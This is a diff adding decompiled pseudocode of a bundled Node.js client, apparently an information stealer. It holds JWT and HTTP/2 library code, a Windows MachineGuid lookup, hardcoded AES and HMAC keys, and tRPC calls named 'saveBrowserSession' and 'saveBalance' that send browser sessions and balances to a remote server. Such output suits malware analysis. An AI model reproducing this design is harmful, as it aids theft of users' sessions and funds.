+					r9 = r9(a0)
+					r10 = "[object ArrayBuffer]"
+					if (r9 === r10)
+					{
+						r7 = Buffer["from"]
+						a0 = r7(a0)
+					}
+					else
+					{
+						if (ArrayBuffer["isView"](a0))
+						{
+							r7 = Buffer["from"]
+							r9 = a0["buffer"]
+							r10 = a0["byteOffset"]
+							a0 = r7(r9, r10, a0["byteLength"])
+						}
+						else
+						{
+							if (!a0 instanceof Scope[5355][132])
+							{
+								r7 = Buffer["from"]
+								r9 = String(a0)
+								a0 = r7(r9)
+							}
+						}
+					}
+				}
+			}
+		}
+	}
+	r9 = new {"body": null, "disturbed": <false, "error": <null}
+	r9["body"] = a0
+	<this>[Scope[5355][142]] = r9
+	<this>["size"] = r2
+	<this>["timeout"] = r4
+	if (a0 instanceof Scope[5355][132])
+	{
+		ACCU = a0["on"]("error", func_handleFetchBodyError_0x100006a1a)
+	}
+	return undefined
+}
+function func_createTypedError_0x100006a17(a0, a1, a2)
+{
+	r2 = Error["call"]
+	ACCU = r2(<this>, a0)
+	<this>["message"] = a0
+	r3 = "type"
+	<this>[r3] = a1
+	if (a2)
+	{
+		r3 = "code"
+		r6 = a2["code"]
+		<this>["errno"] = a2["code"]
+		<this>[r3] = r6
+		ACCU = r6
+	}
+	ACCU = Error["captureStackTrace"](<this>, <this>["constructor"])
+	return undefined
+}
+function func_getDefault_0x100006a15(a0)
+{
+	if (a0)
+	r3 = TypeOf(a0)
+		&& (r3 == "object")
+	r3 = "default"
+	ACCU = r3 in a0
+		&& (r3 in a0)
+	{
+		ACCU = a0["default"]
+	}
+	else
+	{
+		ACCU = a0
+	}
+	return ACCU
+}
+function func_initializeIconvModule_0x100006a13(a0, a1)
+{
+	Scope[5438][8] = func_convertEncoding_0x100006a06
+	Scope[5438][9] = func_A_0x100006a07
+	Scope[5438][10] = func_normalizeCharsetName_0x100006a09
+	Scope[5438][7] = func_initIconvModule_0x100000b57["exports"]()
+	r3 = a1["exports"]
+	r3["convert"] = func_convertCharset_0x100006a04
+	return undefined
+}
+function func_assignUrlExports_0x100006a02(a0)
+{
+	r4 = 0
+	r8 = "URL"
+	r9 = func_initUrlModule_0x1000069fc["exports"]()
+	a0[r8] = r9["interface"]
+	r8 = "serializeURL"
+	r9 = func_initUrlModule_0x10000697c["exports"]()
+	a0[r8] = r9["serializeURL"]
+	r8 = "serializeURLOrigin"
+	r9 = func_initUrlModule_0x10000697c["exports"]()
+	a0[r8] = r9["serializeURLOrigin"]
+	r8 = "basicURLParse"
+	r9 = func_initUrlModule_0x10000697c["exports"]()
+	a0[r8] = r9["basicURLParse"]
+	r8 = "setTheUsername"
+	r9 = func_initUrlModule_0x10000697c["exports"]()
+	a0[r8] = r9["setTheUsername"]
+	r8 = "setThePassword"
+	r9 = func_initUrlModule_0x10000697c["exports"]()
+	a0[r8] = r9["setThePassword"]
+	r8 = "serializeHost"
+	r9 = func_initUrlModule_0x10000697c["exports"]()
+	a0[r8] = r9["serializeHost"]
+	r8 = "serializeInteger"
+	r9 = func_initUrlModule_0x10000697c["exports"]()
+	a0[r8] = r9["serializeInteger"]
+	r8 = "parseURL"
+	r9 = func_initUrlModule_0x10000697c["exports"]()
+	a0[r8] = r9["parseURL"]
+	return undefined
+}
+function func_noopHandler_0x10000673e()
+{
+	return undefined
+}
+function func_initializeNetworkClient_0x100006702()
+{
+	Scope[5560][3] = func_u_0x1000066f5
+	r3 = 0
+	ACCU = func_initializeWebSocketClientModule_0x100005cc9()
+	ACCU = func_initHttp2Client_0x10000425b()
+	ACCU = func_initializeTokenVerification_0x1000047f7()
+	ACCU = func_initMachineId_0x1000054fc()
+	ACCU = func_initializeUrlClass_0x100005cd5()
+	r9 = func_initSocketLinkModule_0x100006625["exports"]()
+	global_nT = func_interopRequireWildcard_0x10000317a(r9)
+	r9 = func_initRequestLinkModule_0x100006643["exports"]()
+	global_rT = func_interopRequireWildcard_0x10000317a(r9)
+	ACCU = func_initializeTRPCClientModule_0x1000066f2()
+	r6 = global_nT["SocketLink"]
+	r7 = new {"connect": null}
+	r7["connect"] = func_connectWebSocket_0x1000066ff
+	ACCU = r6
+	global_iT = r6(r7)
+	r6 = global_rT["RequestLink"]
+	r7 = new {"send": null}
+	r7["send"] = func_sendBinaryData_0x100006700
+	ACCU = r6
+	global_oT = r6(r7)
+	r9 = new {"condition": null, "true": null, "false": null}
+	r9["condition"] = func_isSubscription_0x100006701
+	r11 = new [0]
+	r11[0] = global_iT["target"]()
+	r9["true"] = r11
+	r11 = new [0]
+	r11[0] = global_oT["target"]()
+	r9["false"] = r11
+	global_aT = func_setConditionalLinkScope_0x1000003ef(r9)
+	r9 = new {"links": null}
+	r11 = new [0]
+	r11[0] = global_aT
+	r9["links"] = r11
+	global_iB = func_createTracingClientWrapper_0x1000004a1(r9)
+	r7 = global_iB["core"]["api"]
+	r6 = r7["subscribe"]
+	r8 = undefined
+	r9 = new {"onData": null, "onStopped": null}
+	r9["onData"] = func_onDataPassthrough_0x1000066fd
+	r9["onStopped"] = func_onStopped_0x1000066fe
+	ACCU = r6(r8, r9)
+	return undefined
+}
+function func_initializeUrlClass_0x100005cd5()
+{
+	Scope[6147][10] = func_c_0x100005cca
+	ACCU = ToName("target")
+	ACCU = ToName("link")
+	ACCU = ToName("match")
+	r4 = DefineClass([9, <DescriptorArray[4], <NumberDictionary[7], [], <NameDictionary[29], <NumberDictionary[16], [13, 21, 28]], func_createUrlObject_0x100005cce, URL, r7, func_getPathnameAndSearch_0x100005cd0, 106216, func_getOriginAndPathname_0x100005cd2, 37547, func_isSameOriginAndPath_0x100005cd4)
+	Scope[6148][2] = func_createUrlObject_0x100005cce
+	return undefined
+}
+function func_isSameOriginAndPath_0x100005cd4(a0)
+{
+	ACCU = func_createUrlObject_0x100005cce
+	r4 = func_createUrlObject_0x100005cce(a0, <this>["origin"])
+	r0 = r4["hostname"]
+	r1 = r4["pathname"]
+	r6 = <this>["hostname"]
+	ACCU = r6 === r0
+	if (r6 === r0)
+	{
+		ACCU = <this>["pathname"] === r1
+	}
+	return ACCU
+}
+function func_getOriginAndPathname_0x100005cd2()
+{
+	r2 = ("" + <this>["origin"])
+	return (r2 + <this>["pathname"])
+}
+function func_getPathnameAndSearch_0x100005cd0()
+{
+	r1 = ("" + <this>["pathname"])
+	return (r1 + <this>["search"])
+}
+function func_createUrlObject_0x100005cce(a0, a1)
+{
+	r2 = a0
+	ACCU = a1
+	if (a1 == undefined)
+	{
+		ACCU = "https://unknown"
+	}
+	else
+	{
+		ACCU = a1
+	}
+	r3 = ACCU
+	try
+	{
+		ACCU = <closure>
+		ACCU = r0
+		r10 = supper(r2, r3)
+		ACCU = <this>
+		<this> = r10
+		ACCU = <this>
+	}
+	catch
+	{
+		ACCU = null
+		ACCU = <closure>
+		r7 = supper
+		r9 = ("https://" + r3)
+		ACCU = r0
+		r10 = r7(r2, r9)
+		ACCU = <this>
+		<this> = r10
+		ACCU = <this>
+	}
+	return <this>
+}
+function func_initializeFaroClient_0x100005504()
+{
+	r3 = 0
+	ACCU = func_initDefaultConfig_0x100003185()
+	ACCU = func_initHttp2Client_0x10000425b()
+	ACCU = func_initializeTokenVerification_0x1000047f7()
+	r10 = func_initializeExports_0x100004e1b["exports"]()
+	global_M3 = func_interopRequireWildcard_0x10000317a(r10)
+	ACCU = func_initMachineId_0x1000054fc()
+	r7 = ("https://faro." + global_CE)
+	global_Bv = (r7 + "/collect")
+	r7 = global_M3["initializeFaro"]
+	r8 = new {"app": null, "user": null, "transports": null}
+	r9 = new {"name": null}
+	r9["name"] = "client"
+	r8["app"] = r9
+	r9 = new {"id": null}
+	r9["id"] = global_cE
+	r8["user"] = r9
+	r10 = new [0]
+	r11 = global_M3["AxiosTransport"]
+	r12 = new {"url": null, "axios": null}
+	r12["url"] = global_Bv
+	r12["axios"] = global__b
+	ACCU = _CopyDataProperties(r12, (global_EA["faro"]))
+	ACCU = r11
+	r10[0] = r11(r12)
+	r8["transports"] = r10
+	global_tP = r7(r8)
+	return undefined
+}
+function func_initMachineId_0x1000054fc()
+{
+	r7 = func_initializeNativeModule_0x1000054f8["exports"]()
+	global_hv = func_interopRequireWildcard_0x10000317a(r7)
+	r4 = (require("path"))["join"]
+	r5 = "HKLM"
+	r6 = "SOFTWARE"
+	r7 = "Microsoft"
+	r8 = "Cryptography"
+	global_aE = r4(r5, r6, r7, r8)
+	r4 = global_hv["registryGetValueTyped"]
+	r6 = "MachineGuid"
+	global_cE = r4(global_aE, r6, "SZ")
+	if (!global_cE)
+	{
+		ACCU = Error
+		ACCU = Error("Machine ID not found")
+	}
+	return undefined
+}
+function func_initializeExports_0x100004e1b(a0)
+{
+	Scope[6908][8] = func_A_0x100004e13
+	r3 = 0
+	r6 = Object["defineProperty"]
+	r9 = "__esModule"
+	r10 = new {"value": <true}
+	ACCU = r6(a0, r9, r10)
+	r7 = "FetchTransport"
+	r9 = "AxiosTransport"
+	r12 = undefined
+	a0["initializeFaro"] = undefined
+	a0[r9] = r12
+	a0[r7] = r12
+	Scope[6908][10] = func_initializeModule_0x100004dd7["exports"]()
+	r6 = Object["defineProperty"]
+	r9 = "initializeFaro"
+	r10 = new {"enumerable": <true, "get": null}
+	r10["get"] = func_getInitializeFaro6908_0x100004e16
+	ACCU = r6(a0, r9, r10)
+	Scope[6908][9] = func_initTransportModule_0x100004e12["exports"]()
+	r6 = Object["defineProperty"]
+	r9 = "AxiosTransport"
+	r10 = new {"enumerable": <true, "get": null}
+	r10["get"] = func_getAxiosTransport6908_0x100004e1a
+	ACCU = r6(a0, r9, r10)
+	r6 = Object["defineProperty"]
+	r9 = "FetchTransport"
+	r10 = new {"enumerable": <true, "get": null}
+	r10["get"] = func_getFetchTransport6908_0x100004e18
+	ACCU = r6(a0, r9, r10)
+	return undefined
+}
+function func_initializeTokenVerification_0x1000047f7()
+{
+	ACCU = func_initDefaultConfig_0x100003185()
+	r7 = func_initializeJwtModule_0x1000047f2["exports"]()
+	global_lv = func_interopRequireWildcard_0x10000317a(r7)
+	r4 = global_lv["token"]
+	r5 = "loader"
+	r6 = "RS256"
+	r7 = global_EA["jwt"]["publicKey"]
+	global_Ev = r4(r5, r6, r7)
+	r4 = global_Ev["verify"]
+	r4 = r4(global_EA["loader"]["token"])
+	global_CE = r4["domain"]
+	return undefined
+}
+function func_initializeJwtModule_0x1000047e4(a0, a1)
+{
+	r5 = "exports"
+	r6 = new {"decode": null, "verify": null, "sign": null, "JsonWebTokenError": null, "NotBeforeError": null, "TokenExpiredError": null}
+	r6["decode"] = func_initializeDecodeModule_0x1000043ae["exports"]()
+	r6["verify"] = func_initializeVerifyModule_0x10000469c["exports"]()
+	r6["sign"] = func_initializeSignModule_0x1000047df["exports"]()
+	r6["JsonWebTokenError"] = func_initJsonWebTokenErrorModule_0x1000043b2["exports"]()
+	r6["NotBeforeError"] = func_initNotBeforeErrorModule_0x1000043b7["exports"]()
+	r6["TokenExpiredError"] = func_initTokenExpiredErrorModule_0x1000043bc["exports"]()
+	a1[r5] = r6
+	return undefined
+}
+function func_initializeSignModule_0x1000047df(a0, a1)
+{
+	Scope[7323][22] = func_b_0x10000478a
+	Scope[7323][35] = func_validateOptions_0x100004794
+	Scope[7323][36] = func_getOptions_0x100004796
+	Scope[7323][37] = func_getPayload_0x100004798
+	r7 = new {"znHXA": null, "IEtXy": null, "LKOsI": null, "Dfeuj": null, "yRFds": null, "tAhFj": null, "nifoZ": null, "DBMuK": null, "XvmYK": null, "WrevZ": null, "lHAyL": null, "tjqad": null, "VvSSI": null, "jDlgq": null, "LiEPD": null, "hTbMO": null, "huBcs": null, "VKHen": null, "Veeps": null, "zVAsb": null, "mQCmW": null, "DpDaV": null, "btTkv": null, "TfrEI": null, "Hpilw": null, "vSKug": null, "znSWN": null, "SxzEG": null, "tnpYq": null, "VbRWV": null, "jgRkX": null, "HTOae": null, "ClhaP": null, "bTfYV": null, "SFxlB": null, "FXcZz": null, "mNJWO": null, "cCHTl": null, "EUWxx": null, "msMmQ": null, "xUoAQ": null, "VVOze": null, "ekmqA": null, "jsORZ": null, "otChC": null, "cZllJ": null, "ZUacW": null, "HEfKq": null, "ceagG": null, "OETGE": null, "ZfRul": null, "MvVvn": null, "SUari": null, "HNBCg": null, "SJYJn": null, "YBwgd": null, "PGhwv": null, "rqVob": null, "BphNk": null, "wjBbF": null, "SfNsf": null, "eyZHi": null, "CqOuE": null, "uOFsq": null, "FTeso": null, "nBezR": null, "VunlC": null, "WHhEz": null, "LIXXo": null, "MkycJ": null, "nUNJi": null, "Yivhu": null, "ABwec": null, "eXNSt": null, "lGbXb": null, "KrssC": null, "hiEMY": null, "psZEF": null, "eoLgD": null, "CCxwO": null, "nIofz": null, "XXqVK": null, "pOVGE": null, "twKlO": null, "ABAfa": null, "wYElg": null, "PFpXY": null, "vqHYv": null, "tNrUu": null, "lJpIC": null, "ukpkY": null, "CBWDs": null, "LHPGN": null, "mHscJ": null, "cgyns": null, "cUVAl": null, "kwJIG": null, "inCPc": null, "YWZSr": null, "Aejxs": null, "TGVwc": null, "vajrv": null, "HBhsR": null, "BSGrz": null, "gAehx": null, "ebDfk": null, "FBZJF": null, "JWWaA": null, "sThqj": null, "TbPhI": null, "VSLUY": null, "rlBoQ": null, "NaxsN": null, "EApnF": null, "fQhun": null, "vJnar": null}
+	r7["yRFds"] = "' is not allowed in \""
+	Scope[7323][21] = r7
+	Scope[7323][23] = func_initExpirationModule_0x1000043c8["exports"]()
+	r1 = func_checkNodeVersion6or8_0x10000464d["exports"]()
+	Scope[7323][24] = func_initializeKeyAlgorithmModule_0x10000464a["exports"]()
+	Scope[7323][25] = func_initJwtModule_0x1000043a5["exports"]()
+	r2 = func_initializeIncludesModule_0x10000470f["exports"]()
+	r3 = func_initializeIsBooleanModule_0x100004718["exports"]()
+	Scope[7323][26] = func_initializeIsIntegerModule_0x10000473a["exports"]()
+	r4 = func_exportNumberLikeChecker_0x100004742["exports"]()
+	Scope[7323][27] = func_exportPlainObjectChecker_0x100004758["exports"]()
+	Scope[7323][28] = func_initializeStringTypeModule_0x100004761["exports"]()
+	Scope[7323][29] = func_initializeDebouncerModule_0x100004789["exports"]()
+	r7 = require("crypto")
+	Scope[7323][30] = r7["KeyObject"]
+	Scope[7323][31] = r7["createSecretKey"]
+	Scope[7323][32] = r7["createPrivateKey"]
+	r8 = new [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
+	r8[0] = "RS256"
+	r8[1] = "RS384"
+	r8[2] = "RS512"
+	r8[3] = "ES256"
+	r8[4] = "ES384"
+	r8[5] = "ES512"
+	r8[6] = "HS256"
+	r8[7] = "HS384"
+	r8[8] = "HS512"
+	r8[9] = "none"
+	r5 = r8
+	if (r1)
+	{
+		r7 = r5["splice"]
+		r8 = r5
+		ACCU = r7(3, 0, "PS256", "PS384", "PS512")
+	}
+	r8 = new {"isValid": null, "message": null}
+	r8["isValid"] = func_isValidA_0x1000047ca
+	r8["message"] = "'expiresIn' should be a number of seconds or string representing a timespan"
+	r8 = new {"isValid": null, "message": null}
+	r8["isValid"] = func_isValidB_0x1000047cc
+	r8["message"] = "'notBefore' should be a number of seconds or string representing a timespan"
+	r8 = new {"isValid": null, "message": null}
+	r8["isValid"] = func_isValidC_0x1000047ce
+	r8["message"] = "'audience' must be a string or array"
+	r8 = new {"isValid": null, "message": null}
+	r9 = r2["bind"]
+	r8["isValid"] = r9(null, r5)
+	r8["message"] = "'algorithm' must be a valid string enum value"
+	r8 = new {"isValid": null, "message": null}
+	r8["isValid"] = Scope[7323][27]
+	r8["message"] = "'header' must be an object"
+	r8 = new {"isValid": null, "message": null}
+	r8["isValid"] = Scope[7323][28]
+	r8["message"] = "'encoding' must be a string"
+	r8 = new {"isValid": null, "message": null}
+	r8["isValid"] = Scope[7323][28]
+	r8["message"] = "'issuer' must be a string"
+	r8 = new {"isValid": null, "message": null}
+	r8["isValid"] = Scope[7323][28]
+	r8["message"] = "'subject' must be a string"
+	r8 = new {"isValid": null, "message": null}
+	r8["isValid"] = Scope[7323][28]
+	r8["message"] = "'jwtid' must be a string"
+	r8 = new {"isValid": null, "message": null}
+	r8["isValid"] = r3
+	r8["message"] = "'noTimestamp' must be a boolean"
+	r8 = new {"isValid": null, "message": null}
+	r8["isValid"] = Scope[7323][28]
+	r8["message"] = "'keyid' must be a string"
+	r8 = new {"isValid": null, "message": null}
+	r8["isValid"] = r3
+	r8["message"] = "'mutatePayload' must be a boolean"
+	r8 = new {"isValid": null, "message": null}
+	r8["isValid"] = r3
+	r8["message"] = "'allowInsecureKeySizes' must be a boolean"
+	r8 = new {"isValid": null, "message": null}
+	r8["isValid"] = r3
+	r8["message"] = "'allowInvalidAsymmetricKeyTypes' must be a boolean"
+	r8 = new {"isValid": null, "message": null}
+	r8["isValid"] = r4
+	r8["message"] = "'iat' should be a number of seconds"
+	r8 = new {"isValid": null, "message": null}
+	r8["isValid"] = r4
+	r8["message"] = "'exp' should be a number of seconds"
+	r8 = new {"isValid": null, "message": null}
+	r8 = new [0, 0, 0, 0, 0, 0, 0]
+	r8[0] = "expiresIn"
+	r8[1] = "notBefore"
+	r8[2] = "noTimestamp"
+	r8[3] = "audience"
+	r8[4] = "issuer"
+	r8[5] = "subject"
+	r8[6] = "jwtid"
+	Scope[7323][39] = r8
+	a1["exports"] = func_signJwt_0x1000047de
+	return undefined
+}
+function func_initializeVerifyModule_0x10000469c(a0, a1)
+{
+	Scope[7375][19] = func_g_0x10000464e
+	Scope[7375][5] = func_initJsonWebTokenErrorModule_0x1000043b2["exports"]()
+	Scope[7375][6] = func_initNotBeforeErrorModule_0x1000043b7["exports"]()
+	Scope[7375][7] = func_initTokenExpiredErrorModule_0x1000043bc["exports"]()
+	Scope[7375][8] = func_initializeDecodeModule_0x1000043ae["exports"]()
+	Scope[7375][9] = func_initExpirationModule_0x1000043c8["exports"]()
+	Scope[7375][10] = func_initializeKeyAlgorithmModule_0x10000464a["exports"]()
+	r1 = func_checkNodeVersion6or8_0x10000464d["exports"]()
+	Scope[7375][11] = func_initJwtModule_0x1000043a5["exports"]()
+	r3 = require("crypto")
+	Scope[7375][12] = r3["KeyObject"]
+	Scope[7375][13] = r3["createSecretKey"]
+	Scope[7375][14] = r3["createPublicKey"]
+	r4 = new [0, 0, 0]
+	r4[0] = "RS256"
+	r4[1] = "RS384"
+	r4[2] = "RS512"
+	Scope[7375][15] = r4
+	r4 = new [0, 0, 0]
+	r4[0] = "ES256"
+	r4[1] = "ES384"
+	r4[2] = "ES512"
+	Scope[7375][16] = r4
+	r4 = new [0, 0, 0]
+	r4[0] = "RS256"
+	r4[1] = "RS384"
+	r4[2] = "RS512"
+	Scope[7375][17] = r4
+	r4 = new [0, 0, 0]
+	r4[0] = "HS256"
+	r4[1] = "HS384"
+	r4[2] = "HS512"
+	Scope[7375][18] = r4
+	if (r1)
+	{
+		r3 = Scope[7375][15]["splice"]
+		r5 = Scope[7375][15]["length"]
+		ACCU = r3(r5, 0, "PS256", "PS384", "PS512")
+		r3 = Scope[7375][17]["splice"]
+		r5 = Scope[7375][17]["length"]
+		ACCU = r3(r5, 0, "PS256", "PS384", "PS512")
+	}
+	a1["exports"] = func_verifyJwt_0x10000469b
+	return undefined
+}
+function func_initTokenExpiredErrorModule_0x1000043bc(a0, a1)
+{
+	Scope[7497][6] = func_s_0x1000043b8
+	Scope[7497][5] = func_initJsonWebTokenErrorModule_0x1000043b2["exports"]()
+	r5 = Object["create"]
+	r7 = Scope[7497][5]["prototype"]
+	func_createTokenExpiredError_0x1000043bb["prototype"] = r5(r7)
+	r3 = func_createTokenExpiredError_0x1000043bb["prototype"]
+	r3["constructor"] = func_createTokenExpiredError_0x1000043bb
+	a1["exports"] = func_createTokenExpiredError_0x1000043bb
+	return undefined
+}
+function func_initNotBeforeErrorModule_0x1000043b7(a0, a1)
+{
+	Scope[7499][6] = func_s_0x1000043b3
+	Scope[7499][5] = func_initJsonWebTokenErrorModule_0x1000043b2["exports"]()
+	r5 = Object["create"]
+	r7 = Scope[7499][5]["prototype"]
+	func_createNotBeforeError_0x1000043b6["prototype"] = r5(r7)
+	r3 = func_createNotBeforeError_0x1000043b6["prototype"]
+	r3["constructor"] = func_createNotBeforeError_0x1000043b6
+	a1["exports"] = func_createNotBeforeError_0x1000043b6
+	return undefined
+}
+function func_initJsonWebTokenErrorModule_0x1000043b2(a0, a1)
+{
+	Scope[7501][5] = func_o_0x1000043af
+	r5 = Object["create"]
+	r7 = Error["prototype"]
+	func_createJsonWebTokenError_0x1000043b1["prototype"] = r5(r7)
+	r3 = func_createJsonWebTokenError_0x1000043b1["prototype"]
+	r3["constructor"] = func_createJsonWebTokenError_0x1000043b1
+	a1["exports"] = func_createJsonWebTokenError_0x1000043b1
+	return undefined
+}
+function func_initializeDecodeModule_0x1000043ae(a0, a1)
+{
+	Scope[7502][6] = func_a_0x1000043a6
+	Scope[7502][7] = func_initJwtModule_0x1000043a5["exports"]()
+	a1["exports"] = func_decodeToken_0x1000043ad
+	return undefined
+}
+function func_initHttp2Client_0x10000425b()
+{
+	ACCU = func_invokeCallbackHandler_0x100003ab2()
+	r7 = func_initHttp2Module_0x100003d4b["exports"]()
+	global_Av = func_interopRequireWildcard_0x10000317a(r7)
+	r7 = func_initHttp2AdapterModule_0x100004256["exports"]()
+	global_fv = func_interopRequireWildcard_0x10000317a(r7)
+	r4 = global_fv["createHTTP2Adapter"]
+	r5 = new {"agent": null, "force": <true}
+	r5["agent"] = global_Av["globalAgent"]
+	global_oN = r4(r5)
+	r4 = (func_createAxiosInstance_0x10000013b(global_yh))["create"]
+	r6 = new {"adapter": null}
+	r6["adapter"] = func_selectHttpAdapter_0x10000013f
+	global__b = r4(r6)
+	return undefined
+}
+function func_initDefaultConfig_0x100003185()
+{
+	r4 = new {"loader": null, "diagnostics": {"maxFailCount": 5, "successTimeout": 30000}, "leveldb": {"location": "db"}, "faro": null, "jwt": null, "encryption": null, "hmac": null, "server": null, "proxy": null}
+	r5 = new {"token": null, "task": null, "build": null}
+	r6 = process["env"]
+	r5["token"] = r6["TOKEN"]
+	r6 = new {"name": null}
+	r7 = process["env"]
+	r6["name"] = r7["TASK_NAME"]
+	r5["task"] = r6
+	r6 = new {"hash": null}
+	r7 = process["env"]
+	r6["hash"] = r7["BUILD_HASH"]
+	r5["build"] = r6
+	r4["loader"] = r5
+	r5 = new {"apiKey": null}
+	r5["apiKey"] = "HjvUyAdRCBwaSTak6iiXnaJDiCA4NuZt"
+	r4["faro"] = r5
+	r5 = new {"publicKey": null}
+	r5["publicKey"] = "\n-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtRdWl/ucoH+ZnVuxHrx2\ncTbwEY2LucyUqEJVl6trmNYaJTFX9qDYA8Z4VOaFO86MHg0cY1mJ8NALzTqDt20C\nlnqYtLEuo0Fqg9pJMhnEb078F31dilgdK+5bK7LgwXps06KQ+Dk7XxaqkbPFa7oZ\n73/q4FhrYEtBxFno0WJla7mq49/W4wJb753WYWTjRMjBKVaUIOtAtGdBp8Li2WX2\nPDqxftDcvT8hJf5H6tMJ3tQRpyHu7ljkwdivamG/labZpzKhijK7BMgrd7251sjh\n7zD6prnafayjK+nfD1dvok7Rd8TV8sa1FK8T0uMmGFdUVGK+X4f45AwNWn8OINLE\nVwIDAQAB\n-----END PUBLIC KEY-----"
+	r4["jwt"] = r5
+	r5 = new {"algorithm": null, "key": null}
+	r5["algorithm"] = "aes-256-cbc"
+	r6 = Buffer["from"]
+	r5["key"] = r6("f357d7ed8b7d51d2b086881383764272180b92a7f61de8f579032641a878b010", "hex")
+	r4["encryption"] = r5
+	r5 = new {"key": null}
+	r6 = Buffer["from"]
+	r5["key"] = r6("059cb73cd6ac2ef2281b00bbd0a20615", "hex")
+	r4["hmac"] = r5
+	r5 = new {"host": null, "domain": null}
+	r5["host"] = "127.0.0.1"
+	r5["domain"] = "internal"
+	r4["server"] = r5
+	r5 = new {"listen": null}
+	r6 = new {"socket": null, "httpReader": null, "socketPipe": null, "store": {"limit": 256}}
+	r7 = new {"bufferSize": null}
+	r10 = (1024 * 1024)
+	r7["bufferSize"] = (r10 * 8)
+	r6["socket"] = r7
+	r7 = new {"bufferSize": null, "headersSizeLimit": null}
+	r7["bufferSize"] = (1024 * 8)
+	r7["headersSizeLimit"] = (256 * 1024)
+	r6["httpReader"] = r7
+	r7 = new {"bufferSize": null}
+	r7["bufferSize"] = (1024 * 8)
+	r6["socketPipe"] = r7
+	r5["listen"] = r6
+	r4["proxy"] = r5
+	global_EA = r4
+	return undefined
+}
+function func_interopRequireWildcard_0x10000317a(a0, a1, a2)
+{
+	if (!undetectable === a0)
+	{
+		r1 = (Object["getPrototypeOf"])(a0)
+		ACCU = (Object["create"])(r1)
+	}
+	else
+	{
+	}
+	a2 = {}
+	if (a1)
+		|| (!a0)
+	ACCU = a0["__esModule"]
+		|| (!a0["__esModule"])
+	{
+		r3 = "default"
+		r4 = new {"value": null, "enumerable": <true}
+		r4["value"] = a0
+		ACCU = (Object["defineProperty"])(a2, r3, r4)
+	}
+	else
+	{
+		ACCU = a2
+	}
+	r1 = ACCU
+	return func_copyProperties_0x100003179(r1, a0)
+}
+function func_saveBrowserSession_0x1000005e2(a0)
+{
+	r7 = "browser-session"
+	r9 = global_iB["browsers"]["saveSession"]
+	r9 = r9["mutate"]
+	r11 = new [0, 0]
+	r11[0] = "application"
+	r11[1] = "userId"
+	r5 = r1
+	return global_hl(r7, a0, r9, r11)
+}
+function func_saveBalance_0x1000005d3(a0)
+{
+	r7 = "balance"
+	r9 = global_iB["balances"]["save"]
+	r9 = r9["mutate"]
+	r11 = new [0, 0]
+	r11[0] = "source"
+	r11[1] = "name"
+	r5 = r2
+	return global_hl(r7, a0, r9, r11)
+}
+function func_pushError_0x100000142(a0, a1)
+{
+	r0 = new {"V": "b48I", "J": 97714, "S": "epz[", "g": 117612, "L": "epz[", "X": 95913, "j": "89J2", "E": 59689}
+	r5 = new {"KhfBD": null}
+	r5["KhfBD"] = func_instanceOf_0x100000141
+	r4 = r5["KhfBD"]
+	ACCU = r4(a0, Error)
+	if (r4(a0, Error))
+	{
+		ACCU = a0
+	}
+	else
+	{
+		ACCU = Error
+		ACCU = Error(r0)
+	}
+	r2 = ACCU
+	r4 = global_tP["api"]["pushError"]
+	r7 = new {"context": null}
+	r7["context"] = a1
+	ACCU = r4(r2, r7)
+	return undefined
+}
